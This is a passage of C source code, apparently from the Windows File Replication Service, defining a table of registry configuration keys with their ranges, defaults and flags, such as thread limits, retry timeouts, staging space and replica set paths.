    //  Enumerate Directory Buffer Size in Bytes  (WHY DO WE NEED THIS???)
    {FRS_CONFIG_SECTION, L"Enumerate Directory Buffer Size in Bytes", UNITS_BYTES,
        REG_DWORD, DT_ULONG, MINIMUM_ENUMERATE_DIRECTORY_SIZE, 1024*1024, 4*1024, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_ENUMERATE_DIRECTORY_SIZE, FRS_RKF_READ_AT_START     |
                                          FRS_RKF_READ_AT_POLL      |
                                          FRS_RKF_LOG_EVENT         |
                                          FRS_RKF_RANGE_CHECK       |
                                          FRS_RKF_OK_TO_USE_DEFAULT},


    //  The file filter exclusion list.
    //  Don't supply a default here.  See FRS_DS_COMPOSE_FILTER_LIST for why.
    {FRS_CONFIG_SECTION,    L"File Exclusion Filter List",    UNITS_NONE,
        REG_SZ, DT_FILE_LIST, 0, 0, 0, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_FILE_EXCL_FILTER_LIST,  FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_READ_AT_POLL},


    //  The file filter inclusion list.            Default:  L""
    {FRS_CONFIG_SECTION,    L"File Inclusion Filter List",     UNITS_NONE,
        REG_SZ, DT_FILE_LIST, 0, 0, 0, EVENT_FRS_BAD_REG_DATA,  L"",
            FKC_FILE_INCL_FILTER_LIST,  FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_SYNTAX_CHECK      |
                                        FRS_RKF_CREATE_KEY        |
                                        FRS_RKF_OK_TO_USE_DEFAULT |
                                        FRS_RKF_READ_AT_POLL},


    //  The name of the FRS eventlog message file.
    //      Default value: "%SystemRoot%\system32\ntfrsres.dll"
    // WHY DO WE NEED TO BE ABLE TO CHANGE THIS???
    {FRS_CONFIG_SECTION,    L"Message File Path",        UNITS_NONE,
        REG_EXPAND_SZ, DT_UNICODE, 2, 0, 0, EVENT_FRS_NONE,
        DEFAULT_MESSAGE_FILE_PATH,
            FKC_FRS_MESSAGE_FILE_PATH,  FRS_RKF_READ_AT_START     |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    //  Mutual authentication is [Enabled or Disabled]
    {FRS_CONFIG_SECTION,   FRS_MUTUAL_AUTHENTICATION_IS,       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 200, 0, EVENT_FRS_NONE,
        FRS_IS_DEFAULT_ENABLED,
            FKC_FRS_MUTUAL_AUTHENTICATION_IS,  FRS_RKF_READ_AT_START         |
                                               FRS_RKF_RANGE_CHECK           |
                                               FRS_RKF_VALUE_MUST_BE_PRESENT},


    // Maximum Join Retry time In MilliSeconds             Default: 1 hr.
    {FRS_CONFIG_SECTION,  L"Maximum Join Retry In MilliSeconds",  UNITS_MILLISEC,
        REG_DWORD, DT_ULONG, 30*1000, 10*3600*1000, (60 * 60 * 1000), EVENT_FRS_NONE, NULL,
            FKC_MAX_JOIN_RETRY,         FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Maximum Replica Command Server Threads              Default:  16
    // The replica command server services commands for configuration changes
    // and replication.
    {FRS_CONFIG_SECTION,  L"Maximum Replica Command Server Threads",  UNITS_NONE,
        REG_DWORD, DT_ULONG, 2, 200, (16), EVENT_FRS_NONE, NULL,
            FKC_MAX_REPLICA_THREADS,    FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Max Rpc Server Threads                              Default:  16
    // Maximum number of concurrent RPC calls
    {FRS_CONFIG_SECTION,   L"Max Rpc Server Threads",    UNITS_NONE,
        REG_DWORD, DT_ULONG, 2, 200, (16), EVENT_FRS_NONE, NULL,
            FKC_MAX_RPC_SERVER_THREADS, FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // User specified Rpc port assignment                  Default:  0
    //
    {FRS_CONFIG_SECTION,   L"Rpc TCP/IP Port Assignment",    UNITS_NONE,
        REG_DWORD, DT_ULONG, 0, 0xffffffff, (0), EVENT_FRS_NONE, NULL,
            FKC_RPC_PORT_ASSIGNMENT,    FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Maximum Install Command Server Threads              Default:  4
    {FRS_CONFIG_SECTION,    L"Maximum Install Command Server Threads",  UNITS_NONE,
        REG_DWORD, DT_ULONG, 2, 200, (4), EVENT_FRS_NONE, NULL,
            FKC_MAX_INSTALLCS_THREADS,  FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Maximum Stage Gen Command Server Threads              Default:  4
    {FRS_CONFIG_SECTION,    L"Maximum Stage Gen Command Server Threads",  UNITS_NONE,
        REG_DWORD, DT_ULONG, 2, 200, (4), EVENT_FRS_NONE, NULL,
            FKC_MAX_STAGE_GENCS_THREADS,  FRS_RKF_READ_AT_START     |
                                          FRS_RKF_READ_AT_POLL      |
                                          FRS_RKF_RANGE_CHECK       |
                                          FRS_RKF_OK_TO_USE_DEFAULT},


    // Maximum Stage Fetch Command Server Threads            Default:  4
    {FRS_CONFIG_SECTION,    L"Maximum Stage Fetch Command Server Threads",  UNITS_NONE,
        REG_DWORD, DT_ULONG, 2, 200, (4), EVENT_FRS_NONE, NULL,
            FKC_MAX_STAGE_FETCHCS_THREADS,  FRS_RKF_READ_AT_START     |
                                            FRS_RKF_READ_AT_POLL      |
                                            FRS_RKF_RANGE_CHECK       |
                                            FRS_RKF_OK_TO_USE_DEFAULT},


    // Maximum Initial SYnc Command Server Threads            Default:  4
    {FRS_CONFIG_SECTION,    L"Maximum Initial Sync Command Server Threads",  UNITS_NONE,
        REG_DWORD, DT_ULONG, 2, 200, (4), EVENT_FRS_NONE, NULL,
            FKC_MAX_INITSYNCCS_THREADS,  FRS_RKF_READ_AT_START     |
                                            FRS_RKF_READ_AT_POLL      |
                                            FRS_RKF_RANGE_CHECK       |
                                            FRS_RKF_OK_TO_USE_DEFAULT},


    // Minimum Join Retry time In MilliSeconds             Default:  10 sec.
    // Retry a join every MinJoinRetry milliseconds, doubling the interval
    // every retry. Stop retrying when the interval is greater than MaxJoinRetry.
    {FRS_CONFIG_SECTION,  L"Minimum Join Retry In MilliSeconds", UNITS_MILLISEC,
        REG_DWORD, DT_ULONG, 500, 10*3600*1000, (10 * 1000),   EVENT_FRS_NONE, NULL,
            FKC_MIN_JOIN_RETRY,         FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Partner Clock Skew In Minutes                       Default:  30 min.
    // Partners are not allowed to join if their clocks are out-of-sync
    {FRS_CONFIG_SECTION,  L"Partner Clock Skew In Minutes",     UNITS_MINUTES,
        REG_DWORD, DT_ULONG, 1, 10*60, 30,      EVENT_FRS_NONE, NULL,
            FKC_PARTNER_CLOCK_SKEW,     FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // ChangeOrder Reconcile Event Time Window In Minutes   Default:  30 min.
    {FRS_CONFIG_SECTION,  L"Reconcile Time Window In Minutes", UNITS_MINUTES,
        REG_DWORD, DT_ULONG, 1, 120, 30,      EVENT_FRS_NONE, NULL,
            FKC_RECONCILE_WINDOW,       FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // ChangeOrder Inlog retry interval in seconds   Default:  60 sec.
    {FRS_CONFIG_SECTION,  L"Inlog Retry Time In Seconds", UNITS_SECONDS,
        REG_DWORD, DT_ULONG, 1, 24*3600, 60,  EVENT_FRS_NONE, NULL,
            FKC_INLOG_RETRY_TIME,       FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // ChangeOrder Aging Delay in seconds   Default:  3 sec.
    // Should be a min of 3 sec to allow file system tunnel cache info to propagate.
    {FRS_CONFIG_SECTION,  L"Changeorder Aging Delay In Seconds", UNITS_SECONDS,
        REG_DWORD, DT_ULONG, 3, 30*60, 3,     EVENT_FRS_NONE, NULL,
            FKC_CO_AGING_DELAY,         FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Outlog File Repeat Interval In Seconds   Default:  30 sec.
    // A CO update for a given file will not be sent out more frequently than this.
    // Set to zero to disable the Outlog dominant file update optimization.
    {FRS_CONFIG_SECTION,  L"Outlog File Repeat Interval In Seconds", UNITS_SECONDS,
        REG_DWORD, DT_ULONG, 0, 24*3600, 30,  EVENT_FRS_NONE, NULL,
            FKC_OUTLOG_REPEAT_INTERVAL, FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Sysvol Promotion Timeout In Milliseconds            Default:  10 min.
    {FRS_CONFIG_SECTION,  L"Sysvol Promotion Timeout In Milliseconds",  UNITS_MILLISEC,
        REG_DWORD, DT_ULONG, 0, 3600*1000, (10 * 60 * 1000),   EVENT_FRS_NONE, NULL,
            FKC_PROMOTION_TIMEOUT,      FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Replica Start Timeout In MilliSeconds   Default:  0 means can't start without DS.
    // Start replication even if the DS could not be accessed
    //     0: no DS == no start replicas
    //     N: start replicas in N milliseconds
    {FRS_CONFIG_SECTION,   L"Replica Start Timeout In MilliSeconds", UNITS_MILLISEC,
        REG_DWORD, DT_ULONG, 0, 3600*1000, (0),   EVENT_FRS_NONE, NULL,
            FKC_REPLICA_START_TIMEOUT,  FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Replica Tombstone in Days              Default:  32
    // The length of time we will hold onto the database state for a replica
    // set after we see our membership in the DS has been deleted.  Since
    // delete is not explicit (except for DC Demote) it may just be that the
    // DC is missing our objects or an admin erroneously deleted our subscriber
    // or member object.  Once this time has lapsed we will delete the tables
    // from the database.
    {FRS_CONFIG_SECTION,   L"Replica Tombstone in Days",      UNITS_DAYS,
        REG_DWORD, DT_ULONG, 3, MAXLONG, (32),   EVENT_FRS_NONE, NULL,
            FKC_REPLICA_TOMBSTONE,      FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Shutdown Timeout in Seconds                     Default:  90 sec.
    // The max time FRS main will wait for all threads to exit during shutdown.
    {FRS_CONFIG_SECTION,   L"Shutdown Timeout in Seconds",    UNITS_SECONDS,
        REG_DWORD, DT_ULONG, 30, 24*60*60, DEFAULT_SHUTDOWN_TIMEOUT, EVENT_FRS_NONE, NULL,
            FKC_SHUTDOWN_TIMEOUT,       FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Maximum Send Command Server Threads              Default:  16
    {FRS_CONFIG_SECTION,    L"Maximum Send Command Server Threads",  UNITS_NONE,
        REG_DWORD, DT_ULONG, 2, 200, (16), EVENT_FRS_NONE, NULL,
            FKC_SNDCS_MAXTHREADS_PAR,   FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Staging Space Limit in KB                        Default:  660 MB
    {FRS_CONFIG_SECTION,    L"Staging Space Limit in KB",   UNITS_KBYTES,
        REG_DWORD,   DT_ULONG,   10*1024,  MAXLONG,  (660 * 1024),  EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_STAGING_LIMIT,          FRS_RKF_READ_AT_START     |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT |
                                        FRS_RKF_LOG_EVENT},


    // VvJoin Limit in Change Orders                    Default:  16 ChangeOrders
    // Max number of VVJoin gened COs to prevent flooding.
    {FRS_CONFIG_SECTION,   L"VvJoin Limit in Change Orders",  UNITS_NONE,
        REG_DWORD, DT_ULONG, 2, 128, (16), EVENT_FRS_NONE, NULL,
            FKC_VVJOIN_LIMIT,           FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // VVJoin Outbound Log Throttle Timeout            Default:  1 sec.
    // The time FRS VVJoin thread waits after generating VVJOIN_LIMIT COs.
    {FRS_CONFIG_SECTION,    L"VvJoin Timeout in Milliseconds", UNITS_MILLISEC,
        REG_DWORD, DT_ULONG, 100, 10*60*1000, (1000), EVENT_FRS_NONE, NULL,
            FKC_VVJOIN_TIMEOUT,         FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // The FRS working dir is where the Jet (ESENT) database is created.
    // If this dir does not exist or can't be created FRS will fail to startup.
    {FRS_CONFIG_SECTION,    L"Working Directory",             UNITS_NONE,
        REG_SZ,      DT_DIR_PATH,   4,  10*(MAX_PATH+1), 4, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_WORKING_DIRECTORY,      FRS_RKF_READ_AT_START         |
                                        FRS_RKF_RANGE_CHECK           |
                                        FRS_RKF_VALUE_MUST_BE_PRESENT |
                                        FRS_RKF_SYNTAX_CHECK          |
                                        FRS_RKF_LOG_EVENT },


    // The FRS Log File Directory allows the Jet Logs to created on a different volume.
    // By default they are placed in a Log subdir under the "Working Directory".
    // If this dir does not exist or can't be created FRS will fail to startup.
    {FRS_CONFIG_SECTION,    L"DB Log File Directory",          UNITS_NONE,
        REG_SZ,      DT_DIR_PATH,   4,  10*(MAX_PATH+1), 4, EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_DBLOG_DIRECTORY,        FRS_RKF_READ_AT_START         |
                                        FRS_RKF_RANGE_CHECK           |
                                        FRS_RKF_SYNTAX_CHECK          |
                                        FRS_RKF_LOG_EVENT },


    // Ntfs Journal size in MB                     Default:  128 Meg
    {FRS_CONFIG_SECTION,    L"Ntfs Journal size in MB",   UNITS_MBYTES,
        REG_DWORD, DT_ULONG, 4, 10000, (128), EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_NTFS_JRNL_SIZE,         FRS_RKF_READ_AT_START     |
                                        FRS_RKF_LOG_EVENT         |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},


    // Maximum Number of Replica Sets             Default:  200.
    {FRS_CONFIG_SECTION,    L"Maximum Number of Replica Sets", UNITS_NONE,
        REG_DWORD, DT_ULONG, 1, 5000, (200), EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_MAX_NUMBER_REPLICA_SETS, FRS_RKF_READ_AT_START     |
                                         FRS_RKF_LOG_EVENT         |
                                         FRS_RKF_RANGE_CHECK       |
                                         FRS_RKF_OK_TO_USE_DEFAULT},


    // Maximum Number of Jet Sessions             Default:  128.
    {FRS_CONFIG_SECTION,    L"Maximum Number of Jet Sessions", UNITS_NONE,
        REG_DWORD, DT_ULONG, 1, 5000, (128), EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_MAX_NUMBER_JET_SESSIONS, FRS_RKF_READ_AT_START     |
                                         FRS_RKF_LOG_EVENT         |
                                         FRS_RKF_RANGE_CHECK       |
                                         FRS_RKF_OK_TO_USE_DEFAULT},


    // Maximum Number of outstanding CO's per outbound connection.  Default:  8.
    {FRS_CONFIG_SECTION,    L"Max Num Outbound COs Per Connection", UNITS_NONE,
        REG_DWORD, DT_ULONG, 1, 100, (8), EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_OUT_LOG_CO_QUOTA,        FRS_RKF_READ_AT_START     |
                                         FRS_RKF_LOG_EVENT         |
                                         FRS_RKF_RANGE_CHECK       |
                                         FRS_RKF_OK_TO_USE_DEFAULT},


    //   If TRUE, Preserve OIDs on files whenever possible   Default: False
    //  -- See Bug 352250 for why this is a risky thing to do.
    {FRS_CONFIG_SECTION,  L"Preserve File OID", UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, (FALSE),   EVENT_FRS_NONE, NULL,
            FKC_PRESERVE_FILE_OID,      FRS_RKF_READ_AT_START     |
                                        FRS_RKF_READ_AT_POLL      |
                                        FRS_RKF_RANGE_CHECK       |
                                        FRS_RKF_OK_TO_USE_DEFAULT},
    //
    // Disable compression support. Need a non-auth restore to
    // make sure we don't have any old compressed staging files
    // when this key is turned on.                         Default: True
    //
    {FRS_CONFIG_SECTION,  L"Debug Disable Compression", UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, (FALSE),   EVENT_FRS_NONE, NULL,
            FKC_DEBUG_DISABLE_COMPRESSION,      FRS_RKF_READ_AT_START     |
                                                FRS_RKF_RANGE_CHECK       |
                                                FRS_RKF_OK_TO_USE_DEFAULT},

    //
    // Compress staging files for local changes.  Set to FALSE to disable.
    // This member will continue to install and propagate compressed files.
    // This is useful if the customer has content that originates on this member
    // which is either already compressed or doesn't compress well.
    //                                                     Default: True
    {FRS_CONFIG_SECTION,  L"Compress Staging Files",         UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, (TRUE),    EVENT_FRS_NONE, NULL,
            FKC_COMPRESS_STAGING_FILES,   FRS_RKF_READ_AT_START     |
                                          FRS_RKF_RANGE_CHECK       |
                                          FRS_RKF_OK_TO_USE_DEFAULT},


    //
    // This controls automatic reclaim of staging space by using an
    // LRU algorithm.                                       Default: True
    //
    {FRS_CONFIG_SECTION,  L"Reclaim Staging Space",         UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, (TRUE),    EVENT_FRS_NONE, NULL,
            FKC_RECLAIM_STAGING_SPACE,    FRS_RKF_READ_AT_START     |
                                          FRS_RKF_READ_AT_POLL      |
                                          FRS_RKF_RANGE_CHECK       |
                                          FRS_RKF_OK_TO_USE_DEFAULT},

    //
    // Client side ldap search timeout value.          Default: 10 minutes.
    //
    {FRS_CONFIG_SECTION,    L"Ldap Search Timeout In Minutes", UNITS_MINUTES,
        REG_DWORD, DT_ULONG, 1, 120, (10), EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_LDAP_SEARCH_TIMEOUT_IN_MINUTES, FRS_RKF_READ_AT_START     |
                                         FRS_RKF_LOG_EVENT         |
                                         FRS_RKF_RANGE_CHECK       |
                                         FRS_RKF_OK_TO_USE_DEFAULT},
    //
    // Client side ldap_connect timeout value.         Default: 30 seconds.
    //
    {FRS_CONFIG_SECTION,    L"Ldap Bind Timeout In Seconds", UNITS_SECONDS,
        REG_DWORD, DT_ULONG, 2, MAXLONG, (30), EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_LDAP_BIND_TIMEOUT_IN_SECONDS, FRS_RKF_READ_AT_START     |
                                         FRS_RKF_LOG_EVENT         |
                                         FRS_RKF_RANGE_CHECK       |
                                         FRS_RKF_OK_TO_USE_DEFAULT},

    //
    // The length of time we retry a change order before aborting it.
    // e.g. A file create waiting for the create of a parent dir that
    // never comes.                                       Default: 7 days
    //
    {FRS_CONFIG_SECTION,   L"Maximum CO Retry Timeout in Minutes", UNITS_MINUTES,
        REG_DWORD, DT_ULONG, 1, 525600, (10080),   EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_MAX_CO_RETRY_TIMEOUT_MINUTES, FRS_RKF_READ_AT_START     |
                                           FRS_RKF_READ_AT_POLL      |
                                           FRS_RKF_LOG_EVENT         |
                                           FRS_RKF_RANGE_CHECK       |
                                           FRS_RKF_OK_TO_USE_DEFAULT},

    //
    // The number of retries applied to a change order before aborting it.
    // e.g. A file create waiting for the create of a parent dir that
    // never comes.                                       Default: 3000
    //
    {FRS_CONFIG_SECTION,   L"Maximum CO Retry Count",      UNITS_NONE,
        REG_DWORD, DT_ULONG, 2, MAXLONG, (3000),   EVENT_FRS_BAD_REG_DATA, NULL,
            FKC_MAX_CO_RETRY_TIMEOUT_COUNT, FRS_RKF_READ_AT_START     |
                                         FRS_RKF_READ_AT_POLL      |
                                         FRS_RKF_LOG_EVENT         |
                                         FRS_RKF_RANGE_CHECK       |
                                         FRS_RKF_OK_TO_USE_DEFAULT},

    //
    // Enable automatic restore on journal wrap or journal recreation.
    // This occurs when the replica set gets into either state
    // REPLICA_STATE_JRNL_WRAP_ERROR or REPLICA_STATE_MISMATCHED_JOURNAL_ID.
    // The default is FALSE because a non-auth restore will move the replica
    // tree to the pre-existing dir and make the files unavailable on a DFS
    // alternate.  Customers did not like this.
    //
    {FRS_CONFIG_SECTION,  L"Enable Journal Wrap Automatic Restore",  UNITS_NONE,
    REG_DWORD, DT_BOOL, FALSE, TRUE, (FALSE),    EVENT_FRS_NONE, NULL,
        FKC_ENABLE_JOURNAL_WRAP_AUTOMATIC_RESTORE, FRS_RKF_READ_AT_START     |
                                                   FRS_RKF_READ_AT_POLL      |
                                                   FRS_RKF_RANGE_CHECK       |
                                                   FRS_RKF_OK_TO_USE_DEFAULT},

    //
    // If True then hold the ReplicaList lock for the duration of an outlog cleanup
    // cycle (which could be many minutes).  If False then don't hold the lock.
    //
    {FRS_CONFIG_SECTION,  L"Enable Locked Outlog Cleanup",  UNITS_NONE,
    REG_DWORD, DT_BOOL, FALSE, TRUE, (FALSE),    EVENT_FRS_NONE, NULL,
        FKC_LOCKED_OUTLOG_CLEANUP,          FRS_RKF_READ_AT_START     |
                                            FRS_RKF_RANGE_CHECK       |
                                            FRS_RKF_OK_TO_USE_DEFAULT},

    //
    // This controls how long the change orders will stay in the outlog.
    // Change orders are kept in the outlog to satisfy future vvjoins
    // without having to scan the idtable.            Default: 1 week.
    //
    {FRS_CONFIG_SECTION,  L"Outlog Change History In Minutes", UNITS_MINUTES,
        REG_DWORD, DT_ULONG, 1, MAXLONG, (10080), EVENT_FRS_NONE, NULL,
            FKC_OUTLOG_CHANGE_HISTORY,    FRS_RKF_READ_AT_START     |
                                          FRS_RKF_READ_AT_POLL      |
                                          FRS_RKF_RANGE_CHECK       |
                                          FRS_RKF_OK_TO_USE_DEFAULT},

    //
    // This controls how long whether COs in the outlog even after they have
    // been ACK ed by all the partners.  The longer the COs stay in the outlog
    // the greater the chances of avoiding complete vvjoins.  The period is
    // controlled by the FKC_OUTLOG_CHANGE_HISTORY key above.  The
    // FKC_SAVE_OUTLOG_CHANGE_HISTORY turns this feature off.  Turn this off in
    // cases where the outlog is getting very large.  Even when
    // FKC_SAVE_OUTLOG_CHANGE_HISTORY is turned off FKC_OUTLOG_CHANGE_HISTORY
    // can be set to trim outlog to protect FRS against members that do not
    // come back.
    //                                                     Default: True
    {FRS_CONFIG_SECTION,  L"Debug Save Outlog Change History", UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, (TRUE),    EVENT_FRS_NONE, NULL,
            FKC_SAVE_OUTLOG_CHANGE_HISTORY,  FRS_RKF_READ_AT_START     |
                                             FRS_RKF_READ_AT_POLL      |
                                             FRS_RKF_RANGE_CHECK       |
                                             FRS_RKF_OK_TO_USE_DEFAULT},

    //
    // The "Suppress Identical Updates To Files" key controls whether FRS
    // tries to identify and suppress updates that do not change the content
    // (everything that is used to calculate the MD5 and attributes) of the
    // file.
    //                                                      Default: True
    {FRS_CONFIG_SECTION,  L"Suppress Identical Updates To Files", UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, (TRUE),    EVENT_FRS_NONE, NULL,
            FKC_SUPPRESS_IDENTICAL_UPDATES,   FRS_RKF_READ_AT_START     |
                                              FRS_RKF_READ_AT_POLL      |
                                              FRS_RKF_RANGE_CHECK       |
                                              FRS_RKF_OK_TO_USE_DEFAULT},

    //
    // If true, Install Override tells FRS to attempt to rename an opened
    // target file out of the way in order to allow installation of a new
    // updated version of the file.  E.G. an open .exe or .dll file would
    // be treated this way.  Normally (i.e. when FALSE) FRS will wait until
    // it can open the target with write access.  Install override only works
    // if FRS can open the file for rename.  This requires DELETE access to
    // the file so if the target file is currently open with a sharing mode
    // that denies DELETE access to other opens then FRS will not be able to
    // install the updated version until the file is closed.
    // *NOTE* Install Override only applies to files, not directories.
    //
    //                                                      Default: FALSE
    {FRS_CONFIG_SECTION,  L"Enable Install Override", UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, (FALSE),    EVENT_FRS_NONE, NULL,
            FKC_ENABLE_INSTALL_OVERRIDE,      FRS_RKF_READ_AT_START     |
                                              FRS_RKF_READ_AT_POLL      |
                                              FRS_RKF_RANGE_CHECK       |
                                              FRS_RKF_OK_TO_USE_DEFAULT},

    //
    // If true, then remote change orders that update existing files will
    // always use a pre-install file in which to build the content followed
    // by a rename to insert the file into its target location in the replica
    // tree.  The benefit is that if FRS runs out of disk space during the
    // install phase or the system crashes then a partial file (or a truncated file)
    // is not left in the tree.  The old content is left in place.  The
    // drawback of this is the need for enough disk space to hold two copies of
    // the target file.
    //                                                      Default: FALSE
    {FRS_CONFIG_SECTION,  L"Enable Rename Based File Updates", UNITS_NONE,
        REG_DWORD, DT_BOOL, FALSE, TRUE, (FALSE),    EVENT_FRS_NONE, NULL,
            FKC_ENABLE_RENAME_BASED_UPDATES,  FRS_RKF_READ_AT_START     |
                                              FRS_RKF_READ_AT_POLL      |
                                              FRS_RKF_RANGE_CHECK       |
                                              FRS_RKF_OK_TO_USE_DEFAULT},


    // add ReplDirLevelLimit as a reg key
    // add code support for the following

        //FKC_SET_N_DIR_EXCL_FILTER_LIST,
        //FKC_SET_N_DIR_INCL_FILTER_LIST,
        //FKC_SET_N_FILE_EXCL_FILTER_LIST,
        //FKC_SET_N_FILE_INCL_FILTER_LIST,

        //FKC_SET_N_SYSVOL_DIR_EXCL_FILTER_LIST,
        //FKC_SET_N_SYSVOL_DIR_INCL_FILTER_LIST,
        //FKC_SET_N_SYSVOL_FILE_EXCL_FILTER_LIST,
        //FKC_SET_N_SYSVOL_FILE_INCL_FILTER_LIST,


 /******************************************************************************
 *******************************************************************************
 **                                                                           **
 **                P e r - R e p l i c a   S e t   K e y s                    **
 **                                                                           **
 **                                                                           **
 *******************************************************************************
 ******************************************************************************/


#define FRS_RKEY_SETS_SECTION    FRS_CONFIG_SECTION L",Replica Sets"

#define FRS_RKEY_SET_N           FRS_CONFIG_SECTION L",Replica Sets,ARG1"

#define FRS_RKEY_CUM_SET_N       FRS_CONFIG_SECTION L",Cumulative Replica Sets,ARG1"

#define FRS_RKEY_CUM_SET_SECTION FRS_CONFIG_SECTION L",Cumulative Replica Sets"

    //
    // FRS Sets parameter data.  Lives in
    // "System\\CurrentControlSet\\Services\\NtFrs\\Parameters\\Replica Sets\\[RS-guid]"
    // Used for sysvols currently.
    //
    // No event log messages are generated for these keys since currently
    // they are only created by the service or NTFRSAPI so if they get
    // fouled up there is nothing the USER can do to correct the problem.
    //

    // Cumulative Replica Sets         *NOTE* This is a key def only.
    {FRS_RKEY_SETS_SECTION,  L"*KeyOnly*",                  UNITS_NONE,
        REG_SZ,        DT_UNICODE,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_SET_SECTION_KEY,              0},

    // The FRS working dir is where the Jet (ESENT) database is created.
    // Replica Sets\Database Directory
    {FRS_RKEY_SETS_SECTION,        JET_PATH,         UNITS_NONE,
        REG_SZ,      DT_DIR_PATH,   4,  10*1024, 4, EVENT_FRS_NONE, NULL,
            FKC_SETS_JET_PATH,          FRS_RKF_READ_AT_START         |
                                        FRS_RKF_RANGE_CHECK           |
                                        FRS_RKF_VALUE_MUST_BE_PRESENT |
                                        FRS_RKF_SYNTAX_CHECK},

    // Replica Sets\Guid\Replica Set Name
    {FRS_RKEY_SET_N,        REPLICA_SET_NAME,       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   4,  512, 0, EVENT_FRS_NONE, NULL,
            FKC_SET_N_REPLICA_SET_NAME, FRS_RKF_READ_AT_START         |
                                        FRS_RKF_RANGE_CHECK           |
                                        FRS_RKF_VALUE_MUST_BE_PRESENT},


    // The root of the replica tree.
    // Replica Sets\Guid\Replica Set Root
    {FRS_RKEY_SET_N,        REPLICA_SET_ROOT,       UNITS_NONE,
        REG_SZ,      DT_DIR_PATH,   4,  10*1024, 4, EVENT_FRS_NONE, NULL,
            FKC_SET_N_REPLICA_SET_ROOT, FRS_RKF_READ_AT_START         |
                                        FRS_RKF_RANGE_CHECK           |
                                        FRS_RKF_VALUE_MUST_BE_PRESENT |
                                        FRS_RKF_SYNTAX_CHECK},


    // The staging area for this replica set.
    // Replica Sets\Guid\Replica Set Stage
